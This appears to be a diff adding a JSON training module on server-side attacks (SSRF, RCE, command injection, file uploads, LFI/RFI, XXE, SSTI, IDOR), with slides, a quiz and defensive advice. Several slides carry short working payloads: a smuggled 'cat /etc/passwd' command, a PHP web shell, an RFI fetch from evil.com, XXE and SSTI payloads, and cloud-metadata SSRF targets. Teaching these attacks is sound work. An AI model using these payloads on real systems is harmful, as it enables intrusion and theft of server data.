@@ -1,0 +1,119 @@
+{
+    "id": "learn_server_side_attacks",
+    "topicId": "server_side_attacks",
+    "topicTitle": "Server-Side Attacks",
+    "description": "Exploiting vulnerabilities that execute on the server, including RCE, File Uploads, and LFI/RFI.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "server_intro_1",
+            "type": "content",
+            "title": "Attacking the Backend",
+            "content": "# Behind the Curtain 🏭\n\nServer-side attacks target the application logic, operating system, or backend services. Unlike client-side attacks (which target users), these compromise the organization's infrastructure and data directly.\n\n## The Stakes\n-   Full Database Theft\n-   Server Takeover (Botnet)\n-   Pivot to Internal Network"
+        },
+        {
+            "id": "ssrf_deep_dive_1",
+            "type": "content",
+            "title": "SSRF Deep Dive",
+            "content": "# Server-Side Request Forgery 🔄\n\nTricking the server into making requests on your behalf.\n\n## Types\n-   **Basic SSRF**: Server returns the response to the attacker (e.g., fetch page body).\n-   **Blind SSRF**: Server makes the request but doesn't show the response. Confirmed by timing or out-of-band DNS interactions.\n\n## Targets\n-   **Internal APIs**: `http://localhost/admin/deleteUser`\n-   **Cloud Metadata**: AWS, GCP, Azure instance data.\n-   **Internal Services**: Redis, MongoDB (often bind to localhost without auth)."
+        },
+        {
+            "id": "ssrf_code_example",
+            "type": "content",
+            "title": "Vulnerable Logic: SSRF",
+            "content": "# Vulnerable Code 🐍\n\nA feature to \"Import image from URL\".\n\n```python\nimport requests\nurl = request.args.get('url')\n# No validation!\nresp = requests.get(url)\nreturn resp.content\n```\n\n<!-- FULL_CODE_START\nimport requests\n\nprint(\"=== SSRF Vulnerability Simulation ===\")\n\ndef fetch_image(user_url):\n    print(f\"[*] User requested URL: {user_url}\")\n    \n    # VULNERABLE: No validation of the URL\n    # In a real scenario, requests.get(user_url) would execute.\n    \n    # Logic simulation:\n    if \"localhost\" in user_url or \"127.0.0.1\" in user_url:\n        if \"/admin\" in user_url:\n             return \"[CRITICAL] Returned Internal Admin Page Content!\"\n        return \"[WARNING] Connected to local service (Redis/MySQL)...\"\n    elif \"169.254.169.254\" in user_url:\n        return \"[CRITICAL] Returned AWS Cloud Keys!\"\n    else:\n        return \"[SUCCESS] Fetched external image.\"\n\n# Attack 1: Fetching external\nprint(fetch_image(\"http://google.com/logo.png\"))\n\n# Attack 2: Accessing Cloud Metadata\nprint(fetch_image(\"http://169.254.169.254/latest/meta-data/\"))\n\n# Attack 3: Scanning internal ports\nprint(fetch_image(\"http://localhost:6379\"))  # Redis\nFULL_CODE_END -->"
+        },
+        {
+            "id": "rce_1",
+            "type": "content",
+            "title": "Remote Code Execution (RCE)",
+            "content": "# Remote Code Execution 💣\n\nThe most critical vulnerability. It allows an attacker to execute arbitrary OS commands.\n\n## Causes\n-   **Command Injection**: Passing user input to `system()`, `exec()`, `subprocess`.\n-   **Code Injection**: Evaluating code via `eval()`, `exec()`.\n-   **Insecure Deserialization**: Unpacking malicious objects.\n-   **File Uploads**: Uploading a web shell (PHP/JSP)."
+        },
+        {
+            "id": "command_injection_1",
+            "type": "content",
+            "title": "Command Injection",
+            "content": "# OS Command Injection 💉\n\nOccurs when an app passes unsafe user supplied data (forms, cookies, HTTP headers) to a system shell.\n\n## Example\nFeature: Ping a site to check uptime.\nCode: `system(\"ping \" + host)`\nUser Input: `google.com; cat /etc/passwd`\nResult: Pings google, THEN prints the password file."
+        },
+        {
+            "id": "command_injection_quiz",
+            "type": "quiz",
+            "title": "Cmd Injection Quiz",
+            "content": "Spot the flaw.",
+            "quizQuestion": "Which character is commonly used to separate commands in Linux shells?",
+            "quizOptions": [
+                "@",
+                ";",
+                "%",
+                "#"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "file_upload_1",
+            "type": "content",
+            "title": "File Upload Vulnerabilities",
+            "content": "# File Upload Risks 📤\n\nAllowing users to upload files is dangerous.\n\n## The Attack\n1.  Attacker uploads a PHP script: `shell.php`.\n2.  Content: `<?php system($_GET['cmd']); ?>`.\n3.  Attacker navigates to `uploads/shell.php?cmd=id`.\n4.  Server executes the PHP code.\n\n## Bypasses\n-   **Extensions**: `shell.php5`, `shell.phtml`.\n-   **Content-Type**: Changing `application/x-php` to `image/jpeg` in the request header.\n-   **Null Byte**: `shell.php%00.jpg`."
+        },
+        {
+            "id": "file_upload_defense",
+            "type": "content",
+            "title": "Securing Uploads",
+            "content": "# Secure Uploads Checklist ✅\n\n1.  **Rename Files**: Generate a random UUID filename (`abc-123.jpg`). Never use the user's filename.\n2.  **Validate Extensions**: Allow-list safe extensions only (jpg, png). Deny everything else.\n3.  **Validate Content**: Check Magic Bytes (file signature), not just MIME type.\n4.  **Store Outside Web Root**: Save files in a directory that cannot be executed by the web server (or use S3)."
+        },
+        {
+            "id": "path_traversal_1",
+            "type": "content",
+            "title": "Path Traversal (LFI)",
+            "content": "# Path Traversal / LFI 📂\n\nAccessing files outside the intended directory.\n\n## Logic\n-   App requests: `load_page.php?file=contact.html`\n-   Attacker requests: `?file=../../../../etc/passwd`\n-   The `../` characters instruct the OS to move up the directory tree.\n\n## Local File Inclusion (LFI)\nIf the app *executes* the file (e.g., `include($file)` in PHP), it's LFI. If the attacker can upload a file (even an image with PHP code) and then `include` it via LFI, they get RCE."
+        },
+        {
+            "id": "rfi_1",
+            "type": "content",
+            "title": "Remote File Inclusion (RFI)",
+            "content": "# Remote File Inclusion (RFI) 🌐\n\nLoading code from an *external* server.\n\n## Logic\n-   Attacker requests: `?file=http://evil.com/shell.php`\n-   Server fetches the script from evil.com and runs it.\n-   **Requirement**: `allow_url_include = On` in php.ini (mostly disabled by default now)."
+        },
+        {
+            "id": "idor_server_1",
+            "type": "content",
+            "title": "IDOR (Server Implications)",
+            "content": "# IDOR: Broken Object Level Auth 🆔\n\nInsecure Direct Object Reference.\n\n## Impact\n-   **Data Leak**: `GET /invoice/1001` -> Iterate to 1002, 1003...\n-   **Data Manipulation**: `PUT /users/1001/password` -> Change someone else's password.\n-   **Horizontal Escilation**: Accessing peer data.\n-   **Vertical Escalation**: Accessing admin data."
+        },
+        {
+            "id": "xxe_1",
+            "type": "content",
+            "title": "XML External Entity (XXE)",
+            "content": "# XXE Injection 📑\n\nAttack against XML parsers.\n\n## Mechanism\nXML allows defining \"Entities\" (variables). Example:\n`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>`\n\nIf the parser processes this external entity reference, it reads the local file and replaces `&xxe;` with the file content.\n\n> 🛡️ **Fix**: Disable DTD processing and external entity resolution in your XML parser config."
+        },
+        {
+            "id": "xxe_code",
+            "type": "content",
+            "title": "XXE Payload",
+            "content": "# XXE Payload Example 💣\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n```\n\nIf the server echoes `<foo>`, it echoes `/etc/passwd`."
+        },
+        {
+            "id": "ssti_1",
+            "type": "content",
+            "title": "Server-Side Template Injection",
+            "content": "# Template Injection (SSTI) 📝\n\nModern apps use Template Engines (Jinja2, Thymeleaf, Pug) to render HTML.\n\n## The Flaw\nIf user input is concatenated into a template string instead of passed as data.\n\n## Attack\nInput: `{{ 7*7 }}`\nResult: `49` (Vulnerable!)\nRCE Payload: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`"
+        },
+        {
+            "id": "race_conditions",
+            "type": "content",
+            "title": "Race Conditions",
+            "content": "# Race Conditions 🏁\n\nConcurrency bugs.\n\n## Limit Overrun\n-   Bank checks balance: $100.\n-   Thread A requests withdraw $100.\n-   Thread B requests withdraw $100.\n-   Both checks pass *simultaneously* before deduction.\n-   Result: $200 withdrawn.\n\n> 🛡️ **Fix**: Database Transactions and Locking (Atomic operations)."
+        },
+        {
+            "id": "deserialization_server_1",
+            "type": "content",
+            "title": "Insecure Deserialization",
+            "content": "# Insecure Deserialization 📦\n\nLanguages (Java, PHP, Python) facilitate saving objects to streams (Serialization). Unpacking them (Deserialization) can trigger code.\n\n## Gadget Chains\nAttackers use existing classes in the application (Gadgets) to create a chain of method calls during deserialization that results in command execution (e.g., Apache Commons Collections exploit)."
+        },
+        {
+            "id": "server_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **Input Validation**: The #1 defense. Never trust `$_GET`, `$_POST`, cookies, or headers.\n-   **RCE**: The game-over bug. Avoid `system()` calls.\n-   **Access Control**: Verify authorization for every object access (IDOR).\n-   **Uploads**: Treat user files like radioactive waste.\n-   **XXE/SSTI**: Disable dangerous parser features.\n\nA secure backend protects the crown jewels!"
+        }
+    ]
+}
